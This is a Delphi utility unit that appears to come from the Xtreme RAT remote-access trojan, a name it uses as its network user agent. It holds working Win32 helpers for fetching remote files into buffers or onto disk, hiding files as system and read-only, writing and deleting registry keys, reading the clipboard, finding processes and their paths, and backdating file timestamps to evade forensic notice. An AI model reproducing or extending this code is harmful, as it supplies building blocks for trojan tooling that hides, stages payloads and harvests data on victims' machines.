Unit Functions;

interface

uses
  StrUtils,windows;

const
  faReadOnly  = $00000001 platform;
  faHidden    = $00000002 platform;
  faSysFile   = $00000004 platform;

const
  CSIDL_APPDATA = $001A;
  CSIDL_PROGRAM_FILES = $0026;

function SHDeleteKey(key: HKEY;
  SubKey: PWidechar): cardinal; stdcall; external 'shlwapi.dll' name 'SHDeleteKeyW';
function SHDeleteValue(key: HKEY;
  SubKey, value :PWidechar): cardinal; stdcall; external 'shlwapi.dll' name 'SHDeleteValueW';

function IntToStr(i: Int64): WideString;
function StrToInt(S: WideString): Int64;
function StrLen(const Str: PWideChar): Cardinal;
function lerreg(key: Hkey; Path: WideString; value, Default: WideString): WideString;
function write2reg(key: Hkey; subkey, name, value: pWideChar;
  RegistryValueTypes: DWORD = REG_EXPAND_SZ): boolean;
function MyTempFolder: pWideChar;
function MyWindowsFolder: pWideChar;
function MySystemFolder: pWideChar;
function MyRootFolder: pWideChar;
function GetDefaultBrowser: pWideChar;
function GetProgramFilesDir: pWideChar;
function GetAppDataDir: pWideChar;
function GetShellFolder(CSIDL: integer): pWideChar;
function CriarArquivo(NomedoArquivo: pWideChar; Buffer: pWideChar; Size: int64): boolean;
function SomarPWideChar(p1, p2: pWideChar): pWideChar;
function ParamStr(Index: Integer): pWideChar;
function ForceDirectories(path: PWideChar): boolean;
function FileExists(filename: pWideChar): boolean;
function LerArquivo(FileName: pWideChar; var p: pointer): Int64;
procedure HideFileName(FileName: PWideChar);
function DeletarChave(KEY: HKEY; SubKey: pWideChar): boolean;
function ExtractFilePath(sFilename: pWideChar): pWideChar;
function DownloadToFile(URL, FileName: pWideChar): Boolean;
function DownloadFileToBuffer(const Url: pWideChar; DownloadSize: int64; Buffer: pointer; var BytesRead: dWord): boolean;
procedure ProcessMessages;
Function StartThread(pFunction: TFNThreadStartRoutine; Param: pointer;
  iPriority: integer = Thread_Priority_Normal;
  iStartFlag: integer = 0): THandle;
Function CloseThread(ThreadHandle: THandle): boolean;
function GetClipboardText(Wnd: HWND; var Resultado: pWideChar; var Size: int64): Boolean;
function ShellExecute(hWnd: HWND; Operation, FileName, Parameters,
  Directory: PWideChar; ShowCmd: Integer): HINST; stdcall; external 'shell32.dll' name 'ShellExecuteW';
function ComparePointer(xP1, xP2: Pointer; Size: integer): boolean;
function ExtractFileName(sFilename: pWideChar): pWideChar;
function processExists(exeFileName: pWChar; var PID: Cardinal): Boolean;
function GetPathFromPID(const PID: cardinal): pWideChar;
function SetFileDateTime(FileName: pWideChar; Ano, Mes, Dia, Hora, minuto, segundo: WORD): Boolean;

implementation

function IntToStr(i: Int64): WideString;
begin
  Str(i, Result);
end;

function StrToInt(S: WideString): Int64;
var
  E: integer;
begin
  Val(S, Result, E);
end;

function StrLen(const Str: PWideChar): Cardinal;
asm
  {Check the first byte}
  cmp word ptr [eax], 0
  je @ZeroLength
  {Get the negative of the string start in edx}
  mov edx, eax
  neg edx
@ScanLoop:
  mov cx, word ptr [eax]
  add eax, 2
  test cx, cx
  jnz @ScanLoop
  lea eax, [eax + edx - 2]
  shr eax, 1
  ret
@ZeroLength:
  xor eax, eax
end;

function FindExecutable(FileName, Directory: PWideChar; Result: PWideChar): HINST; stdcall; external 'shell32.dll' name 'FindExecutableW';

function lerreg(key: Hkey; Path: WideString; value, Default: WideString): WideString;
Var
  Handle: Hkey;
  RegType: integer;
  DataSize: integer;
begin
  Result := Default;
  if (RegOpenKeyExW(key, pWideChar(Path), 0, KEY_QUERY_VALUE, Handle) = ERROR_SUCCESS) then
  begin
    if RegQueryValueExW(Handle, pWideChar(value), nil, @RegType, nil, @DataSize) = ERROR_SUCCESS then
    begin
      SetLength(Result, DataSize div 2);
      RegQueryValueExW(Handle, pWideChar(value), nil, @RegType, PByte(pWideChar(Result)), @DataSize);
    end;
    RegCloseKey(Handle);
  end;
  if posex(#0, Result) > 0 then Result := Copy(Result, 1, posex(#0, Result) - 1);
end;

function write2reg(key: Hkey; subkey, name, value: pWideChar;
  RegistryValueTypes: DWORD = REG_EXPAND_SZ): boolean;
var
  regkey: Hkey;
begin
  Result := false;
  RegCreateKeyW(key, subkey, regkey);
  if RegSetValueExW(regkey, name, 0, RegistryValueTypes, value, StrLen(value) * 2) = 0 then
    Result := true;
  RegCloseKey(regkey);
end;

function MyTempFolder: pWideChar;
var
  lpBuffer: array [0..MAX_PATH] of widechar;
begin
  Result := VirtualAlloc(nil, MAX_PATH * 2, MEM_COMMIT, PAGE_READWRITE);
  GetTempPathW(MAX_PATH, Result);
end;

function MyWindowsFolder: pWideChar;
var
  lpBuffer: array [0..MAX_PATH] of widechar;
begin
  GetWindowsDirectoryW(lpBuffer, MAX_PATH);
  Result := SomarPWideChar(lpBuffer, '\');
end;

function MySystemFolder: pWideChar;
var
  lpBuffer: array [0..MAX_PATH] of widechar;
begin
  GetSystemDirectoryW(lpBuffer, MAX_PATH);
  Result := SomarPWideChar(lpBuffer, '\');
end;

function MyRootFolder: pWideChar;
var
  TempStr: pWideChar;
begin
  TempStr := MyWindowsFolder;
  Result := VirtualAlloc(nil, MAX_PATH * 2, MEM_COMMIT, PAGE_READWRITE);
  CopyMemory(result, TempStr, 6);
end;

function GetDefaultBrowser: pWideChar;
var
  Temp: pWideChar;
  i: Cardinal;
begin
  Temp := SomarPWideChar(MyTempFolder, 'x.html');
  CloseHandle(CreateFileW(Temp, GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0));

  Result := VirtualAlloc(nil, MAX_PATH * 2, MEM_COMMIT, PAGE_READWRITE);
  FindExecutable(Temp, nil, Result);

  DeleteFileW(Temp);
end;

function GetProgramFilesDir: pWideChar;
begin
  result := GetShellFolder(CSIDL_PROGRAM_FILES);
end;

function GetAppDataDir: pWideChar;
begin
  result := GetShellFolder(CSIDL_APPDATA);
end;

type
  PSHItemID = ^TSHItemID;
  {$EXTERNALSYM _SHITEMID}
  _SHITEMID = record
    cb: Word;                         { Size of the ID (including cb itself) }
    abID: array[0..0] of Byte;        { The item ID (variable length) }
  end;
  TSHItemID = _SHITEMID;
  {$EXTERNALSYM SHITEMID}
  SHITEMID = _SHITEMID;

  PItemIDList = ^TItemIDList;
  {$EXTERNALSYM _ITEMIDLIST}
  _ITEMIDLIST = record
     mkid: TSHItemID;
   end;
  TItemIDList = _ITEMIDLIST;
  {$EXTERNALSYM ITEMIDLIST}
  ITEMIDLIST = _ITEMIDLIST;

type
  IMalloc = interface(IUnknown)
    ['{00000002-0000-0000-C000-000000000046}']
    function Alloc(cb: Longint): Pointer; stdcall;
    function Realloc(pv: Pointer; cb: Longint): Pointer; stdcall;
    procedure Free(pv: Pointer); stdcall;
    function GetSize(pv: Pointer): Longint; stdcall;
    function DidAlloc(pv: Pointer): Integer; stdcall;
    procedure HeapMinimize; stdcall;
  end;

function Succeeded(Res: HResult): Boolean;
begin
  Result := Res and $80000000 = 0;
end;

function SHGetMalloc(out ppMalloc: IMalloc): HResult; stdcall; external 'shell32.dll' name 'SHGetMalloc'
function SHGetSpecialFolderLocation(hwndOwner: HWND; nFolder: Integer;
  var ppidl: PItemIDList): HResult; stdcall; external 'shell32.dll' name 'SHGetSpecialFolderLocation';
function SHGetPathFromIDList(pidl: PItemIDList; pszPath: PWideChar): BOOL; stdcall; external 'shell32.dll' name 'SHGetPathFromIDListW';

function GetShellFolder(CSIDL: integer): pWideChar;
var
  pidl                   : PItemIdList;
  FolderPath             : pWideChar;
  SystemFolder           : Integer;
  Malloc                 : IMalloc;
begin
  Malloc := nil;
  SHGetMalloc(Malloc);
  FolderPath := nil;

  if Malloc = nil then
  begin
    Result := FolderPath;
    Exit;
  end;

  try
    SystemFolder := CSIDL;
    if SUCCEEDED(SHGetSpecialFolderLocation(0, SystemFolder, pidl)) then
    begin
      FolderPath := VirtualAlloc(nil, MAX_PATH * 2, MEM_COMMIT, PAGE_READWRITE);
      if SHGetPathFromIDList(pidl, FolderPath) = false then FolderPath := nil;
    end;
    Result := FolderPath;
  finally
    Malloc.Free(pidl);
  end;
end;

function CriarArquivo(NomedoArquivo: pWideChar; Buffer: pWideChar; Size: int64): boolean;
var
  hFile: THandle;
  lpNumberOfBytesWritten: DWORD;
begin
  result := False;

  hFile := CreateFileW(NomedoArquivo, GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    if Size = INVALID_HANDLE_VALUE then
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    Result := WriteFile(hFile, Buffer[0], Size, lpNumberOfBytesWritten, nil);
  end;

  CloseHandle(hFile);
end;

function GetParamStr(P: PWideChar; var Param: PWideChar): PWideChar;
var
  i, Len: Integer;
  Start, S, Q: PWideChar;
begin
  Param := nil;
  while True do
  begin
    while (P[0] <> #0) and (P[0] <= ' ') do
      P := CharNextW(P);
    if (P[0] = '"') and (P[1] = '"') then Inc(P, 2) else Break;
  end;
  Len := 0;
  Start := P;
  while P[0] > ' ' do
  begin
    if P[0] = '"' then
    begin
      P := CharNextW(P);
      while (P[0] <> #0) and (P[0] <> '"') do
      begin
        Q := CharNextW(P);
        Inc(Len, Q - P);
        P := Q;
      end;
      if P[0] <> #0 then
        P := CharNextW(P);
    end
    else
    begin
      Q := CharNextW(P);
      Inc(Len, Q - P);
      P := Q;
    end;
  end;

  Param := VirtualAlloc(nil, Len, MEM_COMMIT, PAGE_READWRITE);

  P := Start;
  S := Param;
  i := 0;
  while P[0] > ' ' do
  begin
    if P[0] = '"' then
    begin
      P := CharNextW(P);
      while (P[0] <> #0) and (P[0] <> '"') do
      begin
        Q := CharNextW(P);
        while P < Q do
        begin
          S[i] := P^;
          Inc(P);
          Inc(i);
        end;
      end;
      if P[0] <> #0 then P := CharNextW(P);
    end
    else
    begin
      Q := CharNextW(P);
      while P < Q do
      begin
        S[i] := P^;
        Inc(P);
        Inc(i);
      end;
    end;
  end;

  Result := P;
end;

function SomarPWideChar(p1, p2: pWideChar): pWideChar;
var
  i: integer;
begin
  i := (StrLen(p1) * 2) + (StrLen(p2) * 2);
  Result := VirtualAlloc(nil, i, MEM_COMMIT, PAGE_READWRITE);
  CopyMemory(pointer(integer(Result)), p1, StrLen(p1) * 2);
  CopyMemory(pointer(integer(Result) + (StrLen(p1) * 2)), p2, StrLen(p2) * 2);
end;

function ParamStr(Index: Integer): pWideChar;
var
  P: PWideChar;
begin
  Result := '';
  if Index = 0 then
  begin
    Result := VirtualAlloc(nil, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
    GetModuleFileNameW(0, Result, MAX_PATH);
  end else
  begin
    P := GetCommandLineW;
    while True do
    begin
      P := GetParamStr(P, Result);
      if (Index = 0) or (Result = '') then Break;
      Dec(Index);
    end;
  end;
end;

function ForceDirectories(path: PWideChar): boolean;
  function DirectoryExists(Directory: PWideChar): Boolean;
  var
    Code: Integer;
  begin
    Code := GetFileAttributesW(Directory);
    Result := (Code <> -1) and (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
  end;
var
  Base, Resultado: array [0..MAX_PATH * 2] of WideChar;
  i, j, k: cardinal;
begin
  result := true;
  if DirectoryExists(path) then exit;

  if path <> nil then
  begin
    i := lstrlenw(Path) * 2;
    move(path^, Base, i);

    for k := i to (MAX_PATH * 2) - 1 do Base[k] := #0;
    for k := 0 to (MAX_PATH * 2) - 1 do Resultado[k] := #0;

    j := 0;
    Resultado[j] := Base[j];

    while Base[j] <> #0 do
    begin
      while (Base[j] <> '\') and (Base[j] <> #0) do
      begin
        Resultado[j] := Base[j];
        inc(j);
      end;
      Resultado[j] := Base[j];
      inc(j);

      if DirectoryExists(Resultado) then continue else
      begin
        CreateDirectoryW(Resultado, nil);
        if DirectoryExists(path) then break;
      end;
    end;
  end;
  Result := DirectoryExists(path);
end;

function FileExists(FileName: pWideChar): boolean;
var
  hFile: THandle;
  FDATA: TWin32FindDataW;
begin
  hFile := FindFirstFileW(FileName, FDATA);
  if hFile = INVALID_HANDLE_VALUE then
    Result := FALSE
      else
    Result := TRUE;
  CloseHandle(hFile);
end;

function LerArquivo(FileName: pWideChar; var p: pointer): Int64;
var
  hFile: Cardinal;
  lpNumberOfBytesRead: DWORD;
begin
  result := 0;
  if fileexists(filename) = false then exit;

  hFile := CreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  if hFile <> INVALID_HANDLE_VALUE then
  begin
    result := GetFileSize(hFile, nil);

    //GetMem(p, result);
    p := VirtualAlloc(nil, Result, MEM_COMMIT, PAGE_READWRITE);

    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    ReadFile(hFile, p^, result, lpNumberOfBytesRead, nil);
  end;
  CloseHandle(hFile);
end;

procedure HideFileName(FileName: PWideChar);
var
  i: cardinal;
begin
  i := GetFileAttributesW(FileName);
  i := i or faHidden;   //oculto
  i := i or faReadOnly; //somente leitura
  i := i or faSysFile;  //de sistema
  SetFileAttributesW(FileName, i);
end;

function DeletarChave(KEY: HKEY; SubKey: pWideChar): boolean;
begin
  result := SHDeleteKey(KEY, SubKey) = ERROR_SUCCESS;
end;

function LastDelimiter(S: pWideChar; Delimiter: WideChar): Integer;
var
  i: Integer;
begin
  Result := -1;
  i := StrLen(S);
  if (S = nil) or (i = 0) then Exit;
  while S[i] <> Delimiter do
  begin
    if i < 0 then break;
    dec(i);
  end;
  Result := i;
end;

function ExtractFilePath(sFilename: pWideChar): pWideChar;
begin
  if (LastDelimiter(sFilename, '\') = -1) and (LastDelimiter(sFilename, '/') = -1) then Exit;
  if LastDelimiter(sFilename, '\') <> -1 then
  begin
    Result := VirtualAlloc(nil, LastDelimiter(sFilename, '\') * 2, MEM_COMMIT, PAGE_READWRITE);
    CopyMemory(Result, sFilename, LastDelimiter(sFilename, '\') * 2);
    Result := SomarPWideChar(Result, '\');
  end else
  if LastDelimiter(sFilename, '/') <> -1 then
  begin
    Result := VirtualAlloc(nil, LastDelimiter(sFilename, '/') * 2, MEM_COMMIT, PAGE_READWRITE);
    CopyMemory(Result, sFilename, LastDelimiter(sFilename, '/') * 2);
    Result := SomarPWideChar(Result, '/');
  end;
end;

function URLDownloadToFileW(Caller: pointer;
                            URL: PWideChar;
                            FileName: PWideChar;
                            Reserved: DWORD;
                            StatusCB: pointer): HResult; stdcall; external 'urlmon.dll' name 'URLDownloadToFileW';
function DeleteUrlCacheEntryW(lpszUrlName: pWideChar): BOOL; stdcall; external 'wininet.dll' name 'DeleteUrlCacheEntryW';

function DownloadToFile(URL, FileName: pWideChar): Boolean;
begin
  DeleteUrlCacheEntryW(URL);
  DeleteFileW(FileName);
  result := URLDownloadToFileW(nil, URL, FileName, 0, nil) = 0;
end;

function InternetOpenW(lpszAgent: PWideChar; dwAccessType: DWORD;
  lpszProxy, lpszProxyBypass: PWideChar; dwFlags: DWORD): pointer; stdcall; external 'wininet.dll' name 'InternetOpenW';
function InternetOpenUrlW(hInet: pointer; lpszUrl: PWideChar;
  lpszHeaders: PWideChar; dwHeadersLength: DWORD; dwFlags: DWORD;
  dwContext: DWORD): pointer; stdcall; external 'wininet.dll' name 'InternetOpenUrlW';
function InternetReadFile(hFile: pointer; lpBuffer: Pointer;
  dwNumberOfBytesToRead: DWORD; var lpdwNumberOfBytesRead: DWORD): BOOL; stdcall; external 'wininet.dll' name 'InternetReadFile';
function InternetCloseHandle(hInet: pointer): BOOL; stdcall; external 'wininet.dll' name 'InternetCloseHandle';

var
  XtremeRAT: widestring = 'Xtreme RAT';

function DownloadFileToBuffer(const Url: pWideChar; DownloadSize: int64; Buffer: pointer; var BytesRead: dWord): boolean;
var
  NetHandle: Pointer;
  UrlHandle: Pointer;
begin
  Result := False;
  NetHandle := InternetOpenW(pWideChar(XtremeRAT), 0, nil, nil, 0);
  BytesRead := 0;

  if Assigned(NetHandle) then
  try
    UrlHandle := InternetOpenUrlW(NetHandle, Url, nil, 0, $80000000, 0);

    if Assigned(UrlHandle) then
    { UrlHandle valid? Proceed with download }
    begin
      ZeroMemory(Buffer, DownloadSize);
      try
        Result := InternetReadFile(UrlHandle, Buffer, DownloadSize, BytesRead);
        finally
        InternetCloseHandle(UrlHandle);
      end;
    end else Result := False;

    finally
    InternetCloseHandle(NetHandle);
  end else Result := False;
end;

function xProcessMessage(var Msg: TMsg): Boolean;
begin
  Result := False;
  if PeekMessage(Msg, 0, 0, 0, PM_REMOVE) then
  begin
    Result := True;
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
  end;
  sleep(5);
end;

procedure ProcessMessages; // Usando essa procedure eu percebi que o "processmessage" deve ser colocado no final do loop
var
  Msg: TMsg;
begin
  while xProcessMessage(Msg) do {loop};
end;

Function StartThread(pFunction: TFNThreadStartRoutine; Param: pointer;
  iPriority: integer = Thread_Priority_Normal;
  iStartFlag: integer = 0): THandle;
var
  ThreadID: DWORD;
begin
  Result := CreateThread(nil, 0, pFunction, Param, iStartFlag, ThreadID);
  SetThreadPriority(Result, iPriority);
end;

Function CloseThread(ThreadHandle: THandle): boolean;
begin
  Result := TerminateThread(ThreadHandle, 1);
  CloseHandle(ThreadHandle);
end;

function GetClipboardText(Wnd: HWND; var Resultado: pWideChar; var Size: int64): Boolean;
var
  hData: HGlobal;
begin
  Result := True;
  Size := 0;

  if OpenClipboard(Wnd) then
  begin
    try
      hData := GetClipboardData(CF_UNICODETEXT{CF_TEXT});
      if hData <> 0 then
      begin
        try
          Resultado := GlobalLock(hData);
          Size := GlobalSize(hData) - 2;
        finally
          GlobalUnlock(hData);
        end;
      end
      else
        Result := False;
    finally
      CloseClipboard;
    end;
  end
  else
    Result := False;
end;

function ComparePointer(xP1, xP2: Pointer; Size: integer): boolean;
var
  P1, P2: ^Byte;
  i: integer;
begin
  Result := True;
  P1 := xP1;
  P2 := xP2;
  for i := 0 to Size - 1 do
  begin
    if P1^ <> P2^ then
    begin
      result := false;
      break;
    end;
    inc(P1);
    inc(P2);
  end;
end;

function ExtractFileName(sFilename: pWideChar): pWideChar;
begin
  Result := sFilename;
  if (LastDelimiter(sFilename, '\') = -1) and (LastDelimiter(sFilename, '/') = -1) then Exit;
  if LastDelimiter(sFilename, '\') <> -1 then
  begin
    Result := VirtualAlloc(nil, MAX_PATH * 2, MEM_COMMIT, PAGE_READWRITE);
    CopyMemory(Result, pointer(integer(sFilename) + (LastDelimiter(sFilename, '\') * 2) + 2), MAX_PATH * 2);
  end else
  if LastDelimiter(sFilename, '/') <> -1 then
  begin
    Result := VirtualAlloc(nil, MAX_PATH * 2, MEM_COMMIT, PAGE_READWRITE);
    CopyMemory(Result, pointer(integer(sFilename) + (LastDelimiter(sFilename, '/') * 2) + 2), MAX_PATH * 2);
  end;
end;

type
  TProcessEntry32 = packed record
    dwSize: DWORD;
    cntUsage: DWORD;
    th32ProcessID: DWORD;       // this process
    th32DefaultHeapID: DWORD;
    th32ModuleID: DWORD;        // associated exe
    cntThreads: DWORD;
    th32ParentProcessID: DWORD; // this process's parent process
    pcPriClassBase: Longint;    // Base priority of process's threads
    dwFlags: DWORD;
    szExeFile: array[0..MAX_PATH - 1] of WideChar;// Path
  end;

function CreateToolhelp32Snapshot(dwFlags,
  th32ProcessID: DWORD): THandle stdcall; external 'kernel32.dll' name 'CreateToolhelp32Snapshot';
function Process32First(hSnapshot: THandle;
  var lppe: TProcessEntry32): BOOL stdcall; external 'kernel32.dll' name 'Process32FirstW';
function Process32Next(hSnapshot: THandle;
  var lppe: TProcessEntry32): BOOL stdcall; external 'kernel32.dll' name 'Process32NextW';

function processExists(exeFileName: pWChar; var PID: Cardinal): Boolean;
{description checks if the process is running
URL: http://www.swissdelphicenter.ch/torry/showcode.php?id=2554}
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  FSnapshotHandle        := CreateToolhelp32Snapshot($00000002, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop           := Process32First(FSnapshotHandle, FProcessEntry32);
  PID := 0;
  Result := False;

  while Integer(ContinueLoop) <> 0 do
  begin
    if (ComparePointer(CharUpperW(ExtractFileName(FProcessEntry32.szExeFile)), CharUpperW(ExeFileName), StrLen(ExeFileName) * 2) = True) or
       (ComparePointer(CharUpperW(FProcessEntry32.szExeFile), CharUpperW(ExeFileName), StrLen(ExeFileName) * 2) = True) then
    begin
      Result := True;
      PID := FProcessEntry32.th32ProcessID;
      Break;
    end;

    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

function GetModuleFileNameEx(hProcess: THandle; hModule: HMODULE;
    lpFilename: PWideChar; nSize: DWORD): DWORD stdcall; external 'PSAPI.dll' name 'GetModuleFileNameExW';

function GetPathFromPID(const PID: cardinal): pWideChar;
var
  hProcess: THandle;
begin
  Result := nil;
  hProcess := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, false, PID);
  if hProcess <> 0 then
  try
    Result := VirtualAlloc(nil, MAX_PATH * 2, MEM_COMMIT, PAGE_READWRITE);
    if GetModuleFileNameEx(hProcess, 0, Result, MAX_PATH) = 0 then exit;
    finally
    CloseHandle(hProcess)
  end;
end;

function FileOpen(FileName: pWideChar): Integer;
begin
  Result := Integer(CreateFileW(FileName, GENERIC_READ or GENERIC_WRITE,
                                0,
                                nil,
                                OPEN_EXISTING,
                                FILE_FLAG_BACKUP_SEMANTICS,
                                0));
end;

procedure FileClose(Handle: Integer);
begin
  CloseHandle(THandle(Handle));
end;

function SetFileDateTime(FileName: pWideChar; Ano, Mes, Dia, Hora, minuto, segundo: WORD): Boolean;
var
  FileHandle: Integer;
  FileTime: TFileTime;
  LFT: TFileTime;
  LST: TSystemTime;
begin
  Result := False;
  try
    LST.wYear := Ano; //Minimum = 1601
    LST.wMonth := Mes;
    LST.wDay := Dia;

    LST.wHour := Hora;
    LST.wMinute := Minuto;
    LST.wSecond := Segundo;

    if SystemTimeToFileTime(LST, LFT) then
    begin
      if LocalFileTimeToFileTime(LFT, FileTime) then
      begin
        FileHandle := FileOpen(FileName);
        if FileHandle <> INVALID_HANDLE_VALUE then
        if SetFileTime(FileHandle, @FileTime, @FileTime, @FileTime) then Result := True;
      end;
    end;
  finally
    FileClose(FileHandle);
  end;
end;

end.